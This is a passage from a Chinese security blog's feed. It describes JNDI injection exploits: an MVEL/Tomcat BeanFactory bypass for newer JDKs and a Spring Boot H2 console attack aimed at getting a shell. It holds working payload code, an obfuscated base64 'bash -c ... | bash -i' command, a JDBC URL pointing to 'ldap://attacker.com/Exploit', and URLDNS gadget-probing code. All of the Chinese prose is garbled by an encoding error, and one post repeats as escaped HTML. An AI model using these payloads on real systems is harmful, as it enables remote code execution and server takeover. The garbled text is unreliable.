punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™<code>push</code>æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="åŸå› æ¢ç´¢"><a href="#åŸå› æ¢ç´¢" class="headerlink" title="åŸå› æ¢ç´¢"></a>åŸå› æ¢ç´¢</h2><p>å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>ç»è¿‡ç¼–ç ä¹‹åï¼š <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="å­˜åœ¨pushçš„æ—¶å€™"><a href="#å­˜åœ¨pushçš„æ—¶å€™" class="headerlink" title="å­˜åœ¨pushçš„æ—¶å€™"></a>å­˜åœ¨pushçš„æ—¶å€™</h3><p>ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°<code>_exec()</code>å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡½æ•°åœ¨108è¡Œå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>ï¼Œ <code>\s</code>è¡¨ç¤ºç©ºæ ¼ã€tabã€æ¢è¡Œ: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>ç­‰<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>åˆ†å‰²ä¹‹åï¼Œå¾—åˆ°<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè·å–<code>inTokens[1:]</code>èµ‹å€¼ç»™<code>passParamters</code>ã€‚ç»§ç»­è·Ÿè¿›åˆ°119è¡Œä»£ç : <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>ï¼Œè¿›å…¥è°ƒç”¨pushæŒ‡ä»¤çš„å‡½æ•°ï¼Œæ­¤æ—¶çš„å‚æ•°å¦‚ä¸‹ï¼š<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>åœ¨<code>pushContext.java</code>é‡Œé¢è°ƒç”¨<code>MVEL.eval</code>è§£æMVELè¡¨è¾¾å¼ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹å‡ºæ¥æ‰§è¡Œ<code>MVEL.eval</code>çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="å»æ‰pushçš„æ—¶å€™"><a href="#å»æ‰pushçš„æ—¶å€™" class="headerlink" title="å»æ‰pushçš„æ—¶å€™"></a>å»æ‰pushçš„æ—¶å€™</h3><p>å½“æ²¡æœ‰pushçš„æ—¶å€™ï¼Œæ‰§è¡Œåˆ°<code>SHellSession.java</code>ä¼šè·³è½¬åˆ°123è¡Œä»£ç åˆ†æ”¯ï¼Œç„¶åå®ä¾‹åŒ–<code>MVELInterpretedRuntime</code>ä¹‹åè°ƒç”¨<code>parse()</code>å‡½æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>ç»è¿‡ä¸€ç³»åˆ—è§£æåˆ¤æ–­ä¹‹åæœ€ç»ˆè¿›å…¥åˆ°<code>propertyAccessor.class</code>çš„896è¡Œï¼Œè·å–åˆ°<code>Runtime</code>ä¸Šä¸‹æ–‡ä¹‹åè°ƒç”¨ä¼ å…¥çš„å‚æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>å‡½æ•°è°ƒç”¨å †æ ˆ:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æµ‹è¯•èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;/a&gt;æµ‹è¯•èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨&lt;a href=&quot;https://ares-x.com/tools/runtime-exec/&quot;&gt;runtime exec&lt;/a&gt;ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚&lt;br&gt;&lt;img src=&quot;/2022/03/21/jndi-exec-by-mvel/1.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç»“æœ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;/a&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;&lt;p&gt;æµ…è“å¸ˆå‚…åœ¨&lt;a href=&quot;https://tttang.com/archive/1405/&quot;&gt;æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•&lt;/a&gt;ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tomcat_MVEL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; ref &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.mvel2.sh.ShellSession&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.naming.factory.BeanFactory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;forceString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a=exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™&lt;code&gt;push&lt;/code&gt;æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;a href=&quot;#åŸå› æ¢ç´¢&quot; class=&quot;headerlink&quot; title=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;/a&gt;åŸå› æ¢ç´¢&lt;/h2&gt;&lt;p&gt;å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :&lt;code&gt;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt;&lt;br&gt;ç»è¿‡ç¼–ç ä¹‹åï¼š &lt;code&gt;bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;a href=&quot;#å­˜åœ¨pushçš„æ—¶å€™&quot; class=&quot;headerlink&quot; title=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;/a&gt;å­˜åœ¨pushçš„æ—¶å€™&lt;/h3&gt;&lt;p&gt;ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°&lt;code&gt;_exec()&lt;/code&gt;å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>ä»Spring Boot H2 Databaseåˆ°GetShell</title>
    <link href="https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html"/>
    <id>https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html</id>
    <published>2022-03-17T16:00:00.000Z</published>
    <updated>2023-02-15T05:50:06.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-åˆ‡å…¥ç‚¹"><a href="#0x1-åˆ‡å…¥ç‚¹" class="headerlink" title="0x1. åˆ‡å…¥ç‚¹"></a>0x1. åˆ‡å…¥ç‚¹</h2><p>åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª<code>/console</code>çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨<a href="https://anquan.baidu.com/article/1078">JNDIæ³¨å…¥æ¼æ´</a>.</p><p>è®¾ç½®<code>Driver Class</code>ä¸º<code>javax.naming.InitialContext</code>ï¼Œ<code>JDBC URL</code>ä¸º<code>ldap://attacker.com/Exploit</code>ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>æ ¹æ®<code>/env</code>æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚</p><blockquote><p>RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true<br>LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true</p></blockquote><h2 id="0x2-ç»•è¿‡å’Œåˆ©ç”¨"><a href="#0x2-ç»•è¿‡å’Œåˆ©ç”¨" class="headerlink" title="0x2. ç»•è¿‡å’Œåˆ©ç”¨"></a>0x2. ç»•è¿‡å’Œåˆ©ç”¨</h2><h3 id="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡"><a href="#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡" class="headerlink" title="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡"></a>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡</h3><p>åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li></ul><p>URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…<code>1.ser</code>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºåŠ¨æ€ç”Ÿæˆçš„ç±»ä¹Ÿå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œå› æ­¤ä¸Šé¢ä»£ç ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®ï¼Œæœ€å¥½åœ¨å¦å¤–ä¸€ä¸ªç¯å¢ƒé‡Œé¢ååºåˆ—åŒ–æµ‹è¯•ã€‚<br>postè¯·æ±‚æäº¤ä¸Šé¢ç”Ÿæˆçš„<code>1.ser</code>åˆ°<code>/yso</code>æ¥å£ï¼Œå¦‚æœç”Ÿæˆ<code>1.ser</code>é‡Œé¢çš„ç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å­˜åœ¨ï¼Œåˆ™ä¼šæ”¶åˆ°dnslogè¯·æ±‚ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 